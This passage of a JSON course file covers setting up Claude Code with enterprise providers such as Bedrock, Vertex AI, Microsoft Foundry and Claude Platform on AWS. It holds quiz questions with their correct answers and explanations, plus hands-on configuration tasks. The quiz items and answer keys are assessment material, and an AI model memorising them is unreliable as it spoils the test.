     "Claude Code automatically prompts every user to approve the new model before switching."
    ],
    "correct": 2,
    "sectionIndices": [
     0
    ],
    "explanation": "Unpinned aliases resolve to Claude Code's built-in per-provider defaults, which lag new releases and may not be enabled in your account. Pinning gives you control over upgrade timing."
   },
   {
    "prompt": "You set up Claude Code on Bedrock for your team and explicitly pin ANTHROPIC_DEFAULT_OPUS_MODEL and ANTHROPIC_DEFAULT_SONNET_MODEL, but leave ANTHROPIC_DEFAULT_HAIKU_MODEL unset. What is the most likely unintended consequence?",
    "options": [
     "Background tasks like session titling silently run at primary-model rates, inflating costs.",
     "Claude Code refuses to start without all three model IDs pinned.",
     "The Haiku alias falls back to the last Haiku version in the Bedrock catalog, which is cheaper than the primary.",
     "Haiku tasks queue behind Opus/Sonnet requests, causing latency for background work."
    ],
    "correct": 0,
    "sectionIndices": [
     0
    ],
    "explanation": "On all four providers, the small/fast model defaults to the PRIMARY model when HAIKU is unpinned. Session titles and other background tasks then run at primary rates — silent cost inflation."
   },
   {
    "prompt": "Your org uses both Claude Platform on AWS and AWS Bedrock. You have CLAUDE_CODE_USE_BEDROCK=1 and CLAUDE_CODE_USE_ANTHROPIC_AWS=1 set simultaneously in your environment. Where do requests actually go?",
    "options": [
     "Requests go to Claude Platform on AWS, because ANTHROPIC_AWS takes precedence.",
     "Claude Code errors and refuses to start with both flags set.",
     "Requests go to AWS Bedrock, because BEDROCK takes precedence over Claude Platform on AWS.",
     "Requests are load-balanced between Bedrock and Claude Platform on AWS."
    ],
    "correct": 2,
    "sectionIndices": [
     1
    ],
    "explanation": "CLAUDE_CODE_USE_BEDROCK takes precedence over CLAUDE_CODE_USE_ANTHROPIC_AWS. To use Claude Platform on AWS, you must unset BEDROCK (and FOUNDRY) — otherwise requests silently go to Bedrock."
   },
   {
    "prompt": "You're on Claude Code v2.1.165 (before v2.1.172). Your AWS profile's config file sets region = eu-west-1, but you have not set AWS_REGION or AWS_DEFAULT_REGION. Which region does Claude Code use?",
    "options": [
     "eu-west-1, read from the active profile's config file.",
     "us-east-1, because on v2.1.171 and earlier the AWS config file's region is NOT read.",
     "The region is auto-detected from the nearest AWS endpoint.",
     "Claude Code prompts the user to confirm the region before making any requests."
    ],
    "correct": 1,
    "sectionIndices": [
     2
    ],
    "explanation": "On v2.1.171 and earlier, the AWS config file's region field is not read. Without AWS_REGION or AWS_DEFAULT_REGION set, it falls back to us-east-1 regardless of the profile config."
   },
   {
    "prompt": "Your team runs a credential script that needs to provide cross-account AWS credentials to Claude Code every session. You configure awsCredentialExport with a script path. What constraint must your script satisfy that awsAuthRefresh does NOT have?",
    "options": [
     "The script must complete within 3 minutes, while awsAuthRefresh has no timeout.",
     "The script must return credentials as JSON with keys at the top level (or nested under Credentials), and it runs every session start and each credential reload — it cannot modify .aws files.",
     "The script must write credentials to ~/.aws/credentials and exit with code 0.",
     "The script must accept --profile as an argument matching the AWS_PROFILE env var."
    ],
    "correct": 1,
    "sectionIndices": [
     2
    ],
    "explanation": "awsCredentialExport runs every session start and each credential reload, captures output silently, and must emit credential JSON directly — it cannot modify .aws files. awsAuthRefresh only runs when creds are detected expired and IS allowed to modify .aws files (e.g., aws sso login)."
   },
   {
    "prompt": "You enable Bedrock Mantle (CLAUDE_CODE_USE_MANTLE=1) alongside CLAUDE_CODE_USE_BEDROCK=1. You pin a model with ID us.anthropic.claude-sonnet-4-6 and another with anthropic.claude-haiku-4-5. What routing behavior should you expect?",
    "options": [
     "All requests go to Mantle because MANTLE takes precedence over BEDROCK.",
     "The us.anthropic.claude-sonnet-4-6 ID routes to the Bedrock Invoke API; the anthropic.claude-haiku-4-5 ID routes to Mantle.",
     "Both IDs route to Mantle because both start with anthropic.",
     "Claude Code errors on startup because both flags cannot be active simultaneously."
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "Setting both USE_BEDROCK=1 and USE_MANTLE=1 causes Mantle-format IDs (prefix 'anthropic.' without version suffix) to route to Mantle, while all other IDs (like cross-region inference profile IDs with 'us.') route to the Bedrock Invoke API."
   },
   {
    "prompt": "You set up Claude Platform on AWS for your team. Authentication is configured using AWS credentials and SigV4. A team member also sets ANTHROPIC_AWS_API_KEY in their shell. What happens to their requests?",
    "options": [
     "Requests use SigV4, because SigV4 is the enterprise-grade auth method and takes precedence.",
     "Claude Code errors because you cannot have both auth methods configured.",
     "Requests use the workspace API key sent as x-api-key; AWS credentials are ignored.",
     "Requests use SigV4 for the first session, then switch to the API key after a credential refresh."
    ],
    "correct": 2,
    "sectionIndices": [
     4
    ],
    "explanation": "ANTHROPIC_AWS_API_KEY takes precedence over SigV4. When it is set, AWS credentials are ignored entirely for that user's requests."
   },
   {
    "prompt": "Your team subscribes to Claude via AWS Marketplace and gets provisioned access. A developer tries to use their existing Anthropic Console API key to authenticate with the Claude Platform on AWS endpoint. What happens?",
    "options": [
     "It works — Anthropic Console keys are universally valid across all enterprise providers.",
     "It works only if the developer adds their Console workspace ID as ANTHROPIC_AWS_WORKSPACE_ID.",
     "The Marketplace subscription provisions a NEW Anthropic org tied to the AWS account; Console org credentials do not transfer — they must use the AWS-linked org's workspace ID and keys.",
     "The request succeeds but is billed to the Console org, not the AWS account."
    ],
    "correct": 2,
    "sectionIndices": [
     4
    ],
    "explanation": "AWS Marketplace subscriptions provision a new Anthropic org tied to the AWS account, separate from any pre-existing Console org. Credentials and keys do not transfer between orgs."
   },
   {
    "prompt": "You run Claude Code on Google Vertex AI with CLOUD_ML_REGION=global. You need claude-haiku-4-5 for background tasks but it lacks a global endpoint. What is the correct approach?",
    "options": [
     "Switch CLOUD_ML_REGION to a specific region like us-east5 so all models use that region.",
     "Set VERTEX_REGION_CLAUDE_HAIKU_4_5=us-east5 to override the region for Haiku specifically, leaving other models on global.",
     "Use ANTHROPIC_VERTEX_BASE_URL to point to a different project that has Haiku at the global endpoint.",
     "Enable ENABLE_TOOL_SEARCH=true to allow Claude Code to discover the Haiku endpoint at runtime."
    ],
    "correct": 1,
    "sectionIndices": [
     5
    ],
    "explanation": "The correct approach is per-model region overrides (VERTEX_REGION_CLAUDE_HAIKU_4_5=us-east5) rather than switching everything away from global. This keeps other models on the preferred global endpoint."
   },
   {
    "prompt": "A Vertex AI admin sets GOOGLE_CLOUD_PROJECT=project-A in their environment and also has ANTHROPIC_VERTEX_PROJECT_ID=project-B in settings.json. Which project does Claude Code use, and why?",
    "options": [
     "project-B, because settings.json values always override shell environment variables.",
     "project-A, because GOOGLE_CLOUD_PROJECT overrides ANTHROPIC_VERTEX_PROJECT_ID — the latter is the lowest-precedence source.",
     "Claude Code merges both and tries project-A first, then falls back to project-B.",
     "Whichever project was set most recently in the shell session wins."
    ],
    "correct": 1,
    "sectionIndices": [
     5
    ],
    "explanation": "GCLOUD_PROJECT, GOOGLE_CLOUD_PROJECT, and the file at GOOGLE_APPLICATION_CREDENTIALS all override ANTHROPIC_VERTEX_PROJECT_ID, which is the lowest-precedence source. A stale env var silently targets the wrong project."
   },
   {
    "prompt": "You're enabling MCP tool search (ENABLE_TOOL_SEARCH=true) for a team using Google Vertex AI. Some team members use claude-sonnet-4-5 and others use an older claude-sonnet-4-0 deployment. What is the risk?",
    "options": [
     "MCP tool search costs more on older models, so the team will see higher bills.",
     "Older models reject the beta header sent with tool search enabled, causing requests to FAIL — the feature only works on Sonnet 4.5+ / Opus 4.5+.",
     "MCP tools load lazily on older models, so tool search works but is slower.",
     "ENABLE_TOOL_SEARCH=true is ignored on models older than Sonnet 4.5, falling back to loading all tools upfront."
    ],
    "correct": 1,
    "sectionIndices": [
     5
    ],
    "explanation": "ENABLE_TOOL_SEARCH=true only works on Sonnet 4.5+ / Opus 4.5+. Older models reject the beta header and requests FAIL — they do not silently fall back."
   },
   {
    "prompt": "You configure Microsoft Foundry as your provider. After setting all env vars correctly, you launch Claude Code and get a runtime request failure — no early config error, no model-unavailability warning at startup. Which Foundry behavior explains this?",
    "options": [
     "Foundry has a 30-second startup health check that occasionally times out, producing a runtime error.",
     "Foundry has no interactive wizard and no startup model check — a missing or unavailable default surfaces as a runtime request failure, not an early config error.",
     "Foundry requires a manual /model command to select a model before the first request can succeed.",
     "The Azure SDK DefaultAzureCredential takes longer to resolve than the request timeout, causing the first request to fail."
    ],
    "correct": 1,
    "sectionIndices": [
     6
    ],
    "explanation": "Unlike Bedrock and Vertex, Foundry has no interactive wizard and no startup model check. A missing or unavailable model default surfaces only as a runtime request failure."
   },
   {
    "prompt": "Your enterprise Foundry deployment uses Microsoft Entra ID for authentication. A new developer sets ANTHROPIC_FOUNDRY_API_KEY in their shell from a static key they found in a shared doc, despite your Entra setup. What happens?",
    "options": [
     "Entra ID takes precedence over a static key, so requests still use Entra credentials.",
     "Claude Code uses the static API key and bypasses Entra ID entirely, since ANTHROPIC_FOUNDRY_API_KEY takes precedence when set.",
     "The request fails because both auth methods are configured and Foundry requires exactly one.",
     "Claude Code uses the API key for the first session and Entra ID for subsequent sessions after a credential refresh."
    ],
    "correct": 1,
    "sectionIndices": [
     6
    ],
    "explanation": "ANTHROPIC_FOUNDRY_API_KEY takes precedence when set. The Azure SDK DefaultAzureCredential (Entra ID) is only used when no API key is set. A developer with a static key in their env bypasses Entra entirely."
   }
  ],
  "tasks": [
   {
    "id": "stage-11-task-pin-models",
    "afterSectionIdx": 0,
    "title": "Pin all model IDs in your team settings and verify with /status",
    "instructions": "Open (or create) your project-level Claude Code settings file:\n\n```bash\nmkdir -p .claude\ncat ~/.claude/settings.json  # check your user-level settings first\n```\n\nAdd or merge an `env` block that pins all three model aliases. For Bedrock, use cross-region inference profile IDs; adjust the values for your actual provider:\n\n```json\n{\n  \"env\": {\n    \"ANTHROPIC_DEFAULT_OPUS_MODEL\": \"us.anthropic.claude-opus-4-8\",\n    \"ANTHROPIC_DEFAULT_SONNET_MODEL\": \"us.anthropic.claude-sonnet-4-6\",\n    \"ANTHROPIC_DEFAULT_HAIKU_MODEL\": \"us.anthropic.claude-haiku-4-5-20251001-v1:0\"\n  }\n}\n```\n\nSave to `.claude/settings.json` in your project directory (project-scoped) or `~/.claude/settings.json` (user-scoped for all projects).\n\nThen launch Claude Code and run:\n```\n/status\n```\n\nConfirm the output shows your pinned model IDs and the correct provider.",
    "doneWhen": "The /status command shows your three pinned model IDs (not the alias defaults) and lists the correct provider and region."
   },
   {
    "id": "stage-11-task-bedrock-sso-auth",
    "afterSectionIdx": 2,
    "title": "Configure SSO credential refresh for AWS Bedrock and test mid-session expiry recovery",
    "instructions": "1. Ensure you have an AWS SSO profile configured:\n```bash\naws configure sso --profile my-claude-profile\n# follow the prompts, then:\naws sso login --profile my-claude-profile\nexport AWS_PROFILE=my-claude-profile\n```\n\n2. Add `awsAuthRefresh` to your `.claude/settings.json`:\n```json\n{\n  \"env\": {\n    \"CLAUDE_CODE_USE_BEDROCK\": \"1\",\n    \"AWS_PROFILE\": \"my-claude-profile\",\n    \"AWS_REGION\": \"us-east-1\"\n  },\n  \"awsAuthRefresh\": \"aws sso login --profile my-claude-profile\"\n}\n```\n\n3. Launch Claude Code and run `/status` to confirm Bedrock is the active provider and the region is resolved from AWS_REGION (not the config file).\n\n4. To verify the refresh hook is wired up, run `/login` inside Claude Code — you should see a \"refresh credentials\" option listed alongside any other login options.",
    "doneWhen": "Running /login inside Claude Code shows a 'refresh credentials' option, and /status confirms Bedrock is active with the correct region."
   },
   {
    "id": "stage-11-task-vertex-region-override",
    "afterSectionIdx": 5,
    "title": "Set up Vertex AI with global region and a per-model region override for Haiku",
    "instructions": "1. Authenticate to GCP if you haven't already:\n```bash\ngcloud auth application-default login\n```\n\n2. Add Vertex AI configuration to `~/.claude/settings.json`:\n```json\n{\n  \"env\": {\n    \"CLAUDE_CODE_USE_VERTEX\": \"1\",\n    \"CLOUD_ML_REGION\": \"global\",\n    \"ANTHROPIC_VERTEX_PROJECT_ID\": \"your-gcp-project-id\",\n    \"ANTHROPIC_DEFAULT_SONNET_MODEL\": \"claude-sonnet-4-6\",\n    \"ANTHROPIC_DEFAULT_HAIKU_MODEL\": \"claude-haiku-4-5@20251001\",\n    \"VERTEX_REGION_CLAUDE_HAIKU_4_5\": \"us-east5\"\n  }\n}\n```\nReplace `your-gcp-project-id` with your actual GCP project ID.\n\n3. Launch Claude Code and run `/status`. Confirm it shows Vertex as the provider and `global` as the primary region.\n\n4. To confirm the GOOGLE_CLOUD_PROJECT precedence rule, temporarily run:\n```bash\nexport GOOGLE_CLOUD_PROJECT=some-other-project\nclaude\n```\nThen run `/status` inside — you should see it targeting `some-other-project`, not the value from settings.json. Exit and unset the variable:\n```bash\nunset GOOGLE_CLOUD_PROJECT\n```",
    "doneWhen": "Running /status with GOOGLE_CLOUD_PROJECT unset shows your settings.json project ID; running it with GOOGLE_CLOUD_PROJECT set shows the env var value instead, confirming precedence."
   }
  ],
  "visualizations": [
   {
    "id": "stage-11-v",
    "kind": "comparison-table",
    "title": "Enterprise providers & gateways",
    "textualSummary": "Key concepts of Enterprise providers & gateways: Model pinning, Small/fast model cost trap, Provider enable & routing precedence.",
    "columns": [
     "Concept",
     "In this stage"
    ],
    "rows": [
     {
      "label": "Model pinning",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "Small/fast model cost trap",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "Provider enable & routing precedence",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "Centralized config distribution",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     }
    ]
   }
  ],
  "confusions": [
   {
    "misconception": "Skipping Enterprise providers & gateways.",
    "correction": "Each stage is load-bearing for the setup."
   },
   {
    "misconception": "These concepts are interchangeable.",
    "correction": "Each has a distinct role; see the definitions."
   }
  ],
  "quiz": [
   {
    "id": "stage-11-q1",
    "type": "multiple-choice",
    "prompt": "Your team just enabled Claude Code on AWS Bedrock and didn't pin any model IDs. After a month, Anthropic releases a new Sonnet version and Claude Code's built-in default is updated. What happens to your team's sessions without any action on your part?",
    "options": [
     "Nothing changes — unpinned aliases stay on the model version active at first use until you explicitly upgrade.",
     "The `sonnet` alias silently resolves to the new built-in per-provider default, potentially switching the whole team to a model not yet enabled in your account.",
     "Claude Code refuses to start and prompts you to pin a model ID before continuing.",
     "Claude Code sends a team notification via /status that the default model has changed."
    ],
    "correct": 1,
    "explanation": "The content states: 'Unpinned, the `sonnet`/`opus`/`haiku` aliases resolve to Claude Code's built-in per-provider default, which lags the newest release and may not be enabled in your account. Pinning also gives you control over upgrade timing so a new model release doesn't move the whole team at once.' So an unpinned alias will silently shift when the built-in default updates — the whole team moves without warning. Option A is wrong: aliases are not frozen at first use; they always resolve to the current built-in default. Option C is wrong: there is no refusal-to-start behavior described. Option D is wrong: /status shows current state but does not send proactive notifications about upstream default changes."
   },
   {
    "id": "stage-11-q2",
    "type": "multiple-choice",
    "prompt": "A teammate sets up Claude Code on Bedrock and doesn't pin `ANTHROPIC_DEFAULT_HAIKU_MODEL`. They notice their AWS bill is far higher than expected — session title generation and background tasks are costing as much as primary completions. What is the most likely cause?",
    "options": [
     "The Bedrock service tier defaulted to `priority` mode, which has lower latency but higher per-token cost.",
     "Background tasks like session titles default to the PRIMARY model when `ANTHROPIC_DEFAULT_HAIKU_MODEL` is not pinned, incurring primary-model rates.",
     "Cross-region inference was enabled automatically, adding surcharges on every Haiku call.",
     "The IAM role is missing `bedrock:InvokeModelWithResponseStream`, causing expensive retry storms."
    ],
    "correct": 1,
    "explanation": "The content explicitly warns: 'On all four providers the small/fast (background-task) model defaults to the PRIMARY model — silent cost inflation, since session titles etc. run at primary rates.' Not pinning Haiku means every cheap background call runs at the primary (Sonnet/Opus) rate. Option A is wrong: the default service tier is `default`, not `priority`. Option C is wrong: cross-region inference prefix usage is about routing, not automatic surcharges from unpinned Haiku. Option D is wrong: missing streaming IAM permission would cause errors/failures, not silent cost inflation."
   },
   {
    "id": "stage-11-q3",
    "type": "multiple-choice",
    "prompt": "Your team uses Claude Platform on AWS. A developer exports `ANTHROPIC_AWS_API_KEY` in their shell and also has valid AWS SigV4 credentials configured. Which auth method does Claude Code use, and what happens to the other?",
    "options": [
     "SigV4 takes precedence because it is more secure; the API key is ignored.",
     "Claude Code uses both simultaneously for redundancy — SigV4 for the request signing and the API key for workspace identification.",
     "`ANTHROPIC_AWS_API_KEY` takes precedence over SigV4; when set, AWS credentials are ignored.",
     "Claude Code raises an authentication conflict error and requires you to unset one before proceeding."
    ],
    "correct": 2,
    "explanation": "The content states: '`ANTHROPIC_AWS_API_KEY` takes precedence over SigV4 — when set, AWS creds are ignored.' The API key wins, not SigV4. Option A is wrong: it reverses the documented precedence. Option B is wrong: the two methods are mutually exclusive, not complementary. Option D is wrong: there is no documented conflict error; the resolution is silent and deterministic."
   },
   {
    "id": "stage-11-q4",
    "type": "multiple-choice",
    "prompt": "A team is running Claude Code v2.1.170 on Bedrock. Their AWS shared config file sets `region = eu-west-1` in the `[default]` profile. They have not set `AWS_REGION` or `AWS_DEFAULT_REGION`. Which region does Claude Code use?",
    "options": [
     "`eu-west-1`, read from the AWS shared config file.",
     "`us-east-1`, because on v2.1.171 and earlier the AWS config file's region is NOT read.",
     "`us-west-2`, the hardcoded Bedrock default when no region env var is present.",
     "Claude Code prompts the user to specify the region at startup since it cannot determine it automatically."
    ],
    "correct": 1,
    "explanation": "The content states: 'On v2.1.171 and earlier the AWS config file's `region` is NOT read — set `AWS_REGION` explicitly or it falls back to `us-east-1`.' v2.1.170 is earlier than v2.1.171, so the config file is ignored and the fallback is `us-east-1`. Option A is wrong: the config file region is only read in v2.1.172+. Option C is wrong: the documented fallback is `us-east-1`, not `us-west-2`. Option D is wrong: there is no interactive region prompt described."
   },
   {
    "id": "stage-11-q5",
    "type": "multiple-choice",
    "prompt": "A team migrates from an existing Anthropic Console organization to Claude Platform on AWS via an AWS Marketplace subscription. They try to use their existing Console workspace API keys with the new setup. The keys are rejected on every request. Why?",
    "options": [
     "AWS Marketplace subscriptions require IAM-based auth; API keys are not supported on this provider.",
     "AWS Marketplace subscription provisions a NEW Anthropic org tied to the AWS account, separate from any pre-existing Console org; credentials and keys do not transfer.",
     "The keys must be re-issued by rotating them through the AWS Secrets Manager before they are valid on the AWS-linked org.",
     "The `ANTHROPIC_AWS_WORKSPACE_ID` env var must be set to the old Console workspace ID to bridge the two orgs."
    ],
    "correct": 1,
    "explanation": "The content states: 'AWS Marketplace subscription provisions a NEW Anthropic org tied to the AWS account, separate from any pre-existing Console org; credentials/keys do not transfer — use the AWS-linked org's workspace ID + keys.' The two orgs are completely separate. Option A is wrong: API keys are supported on Claude Platform on AWS via `ANTHROPIC_AWS_API_KEY`. Option C is wrong: there is no key-rotation bridge through AWS Secrets Manager described. Option D is wrong: using the old workspace ID will fail because the orgs are separate; a new workspace ID from the AWS-linked org is needed."
   },
   {
    "id": "stage-11-q6",
    "type": "multiple-choice",
    "prompt": "You're setting up MCP tool search on Vertex AI. Your team pins the model to `claude-sonnet-4-0` (an older Sonnet release) and sets `ENABLE_TOOL_SEARCH=true`. When the agent makes a request that triggers tool search, what happens?",
    "options": [
     "Tool search works normally — the beta header is ignored on older models and the request succeeds without it.",
     "The request fails because MCP tool search on Vertex is only supported on Sonnet 4.5+ and Opus 4.5+; older models reject the beta header.",
     "Tool search silently falls back to loading all tool definitions upfront, the same behavior as when `ENABLE_TOOL_SEARCH` is not set.",
     "Vertex AI upgrades the model alias to the nearest supported version automatically."
    ],
    "correct": 1,
    "explanation": "The content states: 'Opt in with `ENABLE_TOOL_SEARCH=true` — only on Sonnet 4.5+ / Opus 4.5+ (older models reject the beta header and requests FAIL).' Requests on older models do not silently degrade; they fail. Option A is wrong: the beta header is not ignored; it actively causes failures on unsupported models. Option C is wrong: the content says requests FAIL, not that they silently fall back. Option D is wrong: Vertex AI does not perform automatic model alias upgrades."
   },
   {
    "id": "stage-11-q7",
    "type": "multiple-choice",
    "prompt": "A Vertex AI deployment sets both `ANTHROPIC_VERTEX_PROJECT_ID=my-project` and `GOOGLE_CLOUD_PROJECT=other-project` in the environment. Which project receives the API requests?",
    "options": [
     "`my-project`, because `ANTHROPIC_VERTEX_PROJECT_ID` is the Claude Code-specific variable and takes precedence over generic GCP variables.",
     "`other-project`, because `GCLOUD_PROJECT`, `GOOGLE_CLOUD_PROJECT`, and the file at `GOOGLE_APPLICATION_CREDENTIALS` all override `ANTHROPIC_VERTEX_PROJECT_ID`, which is the lowest-precedence source.",
     "Claude Code merges the two project IDs and routes to whichever project has available quota first.",
     "Whichever env var was exported last in the shell wins."
    ],
    "correct": 1,
    "explanation": "The content states: '`GCLOUD_PROJECT`, `GOOGLE_CLOUD_PROJECT`, and the file at `GOOGLE_APPLICATION_CREDENTIALS` all override `ANTHROPIC_VERTEX_PROJECT_ID` (the lowest-precedence source). A stale env/credential file silently targets the wrong project.' `GOOGLE_CLOUD_PROJECT` overrides `ANTHROPIC_VERTEX_PROJECT_ID`. Option A is wrong: despite being Claude Code-specific, `ANTHROPIC_VERTEX_PROJECT_ID` is the lowest-precedence source. Option C is wrong: there is no quota-based merging behavior. Option D is wrong: shell export order is irrelevant; the documented precedence hierarchy determines the winner."
   },
   {
    "id": "stage-11-q8",
    "type": "multiple-choice",
    "prompt": "Your team uses Claude Platform on AWS (`CLAUDE_CODE_USE_ANTHROPIC_AWS=1`) with an SSO profile. Mid-session, the SSO token expires. The team has configured `awsAuthRefresh` with a login command. What does `awsAuthRefresh` do, and what does it NOT do?",
    "options": [
     "`awsAuthRefresh` runs at every session start to pre-warm credentials; it does not handle mid-session expiry.",
     "`awsAuthRefresh` re-runs the login command when mid-session SSO expiry occurs, but it cannot modify `.aws` files and must return credentials directly in JSON format.",
     "`awsAuthRefresh` re-runs the login command on mid-session SSO expiry; it can modify `.aws` files and adds a 'refresh credentials' option under `/login`.",
     "`awsAuthRefresh` and `awsCredentialExport` are interchangeable; either can be used for mid-session refresh."
    ],
    "correct": 2,
    "explanation": "The content says: '`awsAuthRefresh`: Only when creds detected expired…then retries. SSO login commands that modify `.aws`; adds a \"refresh credentials\" option under `/login`.' This is distinct from `awsCredentialExport` which runs at every session start and cannot modify `.aws`. On Claude Platform on AWS, `awsAuthRefresh` re-runs the login command on mid-session SSO expiry. Option A is wrong: that describes `awsCredentialExport`'s every-session-start behavior, not `awsAuthRefresh`. Option B is wrong: it conflates `awsAuthRefresh` constraints with `awsCredentialExport` constraints — `awsCredentialExport` is the one that cannot modify `.aws` and must return JSON directly. Option D is wrong: they are explicitly separate settings with different trigger conditions and capabilities."
   },
   {
    "id": "stage-11-q9",
    "type": "multiple-choice",
    "prompt": "A team sets `CLAUDE_CODE_USE_BEDROCK=1` and also `CLAUDE_CODE_USE_ANTHROPIC_AWS=1` in their environment, intending to use Claude Platform on AWS. Where do their requests actually go?",
    "options": [
     "Claude Platform on AWS, because `CLAUDE_CODE_USE_ANTHROPIC_AWS=1` explicitly names the intended destination.",
     "AWS Bedrock, because `CLAUDE_CODE_USE_BEDROCK` takes precedence over Claude Platform on AWS; to use Platform-on-AWS, `CLAUDE_CODE_USE_BEDROCK` must be unset.",
     "Requests are load-balanced between Bedrock and Claude Platform on AWS based on model availability.",
     "Claude Code raises a configuration conflict error since both providers target AWS infrastructure."
    ],
    "correct": 1,
    "explanation": "The content states: '`CLAUDE_CODE_USE_BEDROCK` and `CLAUDE_CODE_USE_FOUNDRY` take precedence over Claude Platform on AWS. If Platform-on-AWS should be used, unset both — otherwise requests silently go to the wrong provider.' Having `CLAUDE_CODE_USE_BEDROCK=1` set will silently route to Bedrock even if `CLAUDE_CODE_USE_ANTHROPIC_AWS=1` is also set. Option A is wrong: explicit intent in the variable name does not override the documented routing precedence. Option C is wrong: there is no load-balancing behavior. Option D is wrong: the conflict is resolved silently by precedence, not by an error."
   },
   {
    "id": "stage-11-q10",
    "type": "multi-select",
    "prompt": "Your team is rolling out Claude Code on Bedrock to 50 developers. Select ALL practices that the documentation explicitly recommends for this enterprise rollout.",
    "options": [
     "Use the manual env-var setup path for CI/scripted enterprise rollouts, not the interactive wizard.",
     "Pin `ANTHROPIC_DEFAULT_HAIKU_MODEL` to a real Haiku model deployment to prevent background tasks from running at primary-model rates.",
     "Distribute workspace API keys and `AWS_PROFILE` values via `settings.json` env blocks rather than per-developer shell exports.",
     "Run `/status` first to confirm resolved provider, region, workspace ID, and auth settings before making any changes.",
     "Run the interactive `/setup-bedrock` wizard for each developer's machine to ensure per-user settings are correctly scoped."
    ],
    "correct": [
     0,
     1,
     2,
     3
    ],
    "explanation": "Options A, B, C, and D are all explicitly recommended. A: 'Use the manual env-var setup path for CI/scripted enterprise rollouts, not the interactive wizard.' B: 'Pin `ANTHROPIC_DEFAULT_HAIKU_MODEL` to a real Haiku model/deployment.' C: 'Distribute config via the `env` block of `settings.json`…not per-developer shell exports. Treat workspace API keys and `AWS_PROFILE` as production credentials kept in settings files.' D: 'Run `/status` first — confirms resolved provider, region…before you change anything.' Option E is wrong: the docs explicitly say to use the manual env-var path for enterprise rollouts, not the interactive wizard."
   },
   {
    "id": "stage-11-q11",
    "type": "multi-select",
    "prompt": "Which of the following statements about Microsoft Foundry are TRUE according to the documentation? Select all that apply.",
    "options": [
     "There is no interactive wizard for Foundry; env vars are the only config path.",
     "Missing or unavailable models surface as an early startup config error, similar to Bedrock's startup model check.",
     "Microsoft Entra ID via `DefaultAzureCredential` is the preferred auth method for enterprise rollouts over static API keys.",
     "Model alias env vars must match the Azure deployment names created in the Foundry portal.",
     "Foundry supports the same `awsAuthRefresh` hook for handling mid-session credential expiry as Bedrock."
    ],
    "correct": [
     0,
     2,
     3
    ],
    "explanation": "A is true: 'No interactive wizard (unlike Bedrock/Vertex) — env vars are the only config path.' B is false: 'No startup model check — a missing/unavailable default surfaces as a runtime request failure, not an early config error.' C is true: 'Prefer Entra ID for enterprise rollouts over static keys.' D is true: 'Model alias env vars must match the Azure deployment names created in the Foundry portal.' E is false: `awsAuthRefresh` is documented for AWS providers (Bedrock and Claude Platform on AWS); there is no mention of it for Foundry."
   },
   {
    "id": "stage-11-q12",
    "type": "multiple-choice",
    "prompt": "A team wants to enable Bedrock Guardrails with cross-region inference profiles. They set the guardrail identifier and version via `ANTHROPIC_CUSTOM_HEADERS`. After deploying, requests are routed across multiple AWS regions but guardrail evaluation is inconsistently applied. What step did they most likely miss?",
    "options": [
     "They need to set `ANTHROPIC_BEDROCK_SERVICE_TIER=priority` to ensure guardrails are applied consistently at all latency levels.",
     "They need to enable Cross-Region inference on the Guardrail itself when using cross-region inference profiles.",
     "They should switch from `ANTHROPIC_CUSTOM_HEADERS` to a dedicated guardrail env var, since custom headers bypass guardrail enforcement on cross-region calls.",
     "They must grant the IAM action `bedrock:ApplyGuardrail` separately for each region."
    ],
    "correct": 1,
    "explanation": "The content states: 'Enable Cross-Region inference on the Guardrail when using cross-region inference profiles.' Guardrails are set via `ANTHROPIC_CUSTOM_HEADERS` correctly, but cross-region inference profiles require the Guardrail to have Cross-Region inference enabled at the Guardrail configuration level. Option A is wrong: service tier affects cost/latency, not guardrail consistency. Option C is wrong: `ANTHROPIC_CUSTOM_HEADERS` is the documented mechanism for setting guardrails; there is no separate dedicated env var mentioned, and custom headers do not bypass guardrails. Option D is wrong: there is no `bedrock:ApplyGuardrail` per-region grant mentioned; the documented IAM actions are InvokeModel, ListInferenceProfiles, etc."
   },
   {
    "id": "stage-11-q13",
    "type": "multiple-choice",
    "prompt": "A teammate configures `awsCredentialExport` with a script that calls a secrets manager to return cross-account credentials. After the first session, they modify the shared AWS config file to add a new default profile. The next day they notice `awsCredentialExport` is still called even though they have valid, non-expired credentials. They expected it would be skipped. Why is it still running?",
    "options": [
     "The teammate introduced a config file syntax error that invalidates the stored credentials, causing the export hook to be re-triggered.",
     "`awsCredentialExport` runs at every session start and on each credential reload, even when current credentials are valid — it is not skipped for non-expired credentials.",
     "`awsCredentialExport` only runs when `AWS_SHARED_CREDENTIALS_FILE` is set to a non-default path, and that env var was inadvertently set.",
     "`awsCredentialExport` replaces `awsAuthRefresh`, so it now handles both expiry refreshes and session starts, causing the extra runs."
    ],
    "correct": 1,
    "explanation": "The content states: '`awsCredentialExport`: Every session start + each credential reload (even if valid); output captured silently.' It always runs regardless of whether credentials are valid or expired. This is a key behavioral difference from `awsAuthRefresh`, which only runs when credentials are detected as expired. Option A is wrong: config file errors do not trigger the export hook. Option C is wrong: `awsCredentialExport` trigger is not conditioned on `AWS_SHARED_CREDENTIALS_FILE` being set. Option D is wrong: the two hooks are separate settings with distinct trigger conditions, not substitutes for each other."
   },
   {
    "id": "stage-11-q14",
    "type": "multiple-choice",
    "prompt": "A team wants to enable 1M context on Vertex AI for Opus. They have manually pinned a model ID and set `CLOUD_ML_REGION=global`. What additional step is required to enable 1M context?",
    "options": [
     "Set `ANTHROPIC_VERTEX_LARGE_CONTEXT=1` to opt the session into the extended context window.",
     "Switch `CLOUD_ML_REGION` from `global` to a specific region that supports 1M context, since the global endpoint does not support extended windows.",
     "Append `[1m]` to the manually pinned model ID, since 1M context is auto-enabled only for 1M variants and must be requested explicitly for manually pinned IDs.",
     "Request a quota increase from Google Cloud support, as 1M context requires provisioned capacity that is not included in the default Vertex AI plan."
    ],
    "correct": 2,
